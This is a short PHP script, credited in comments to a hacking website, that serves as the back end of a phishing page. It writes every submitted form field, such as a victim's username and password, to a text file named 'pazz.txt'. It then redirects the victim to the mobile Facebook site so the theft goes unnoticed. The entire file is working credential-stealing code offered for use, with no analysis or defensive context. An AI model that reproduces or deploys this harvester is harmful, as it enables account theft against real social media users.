 <?php
// www.philiphacker.in
header
('location:');
$handle=fopen("pazz.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
header("location:http://m.facebook.com");
exit;
// www.philiphacker.in
?>
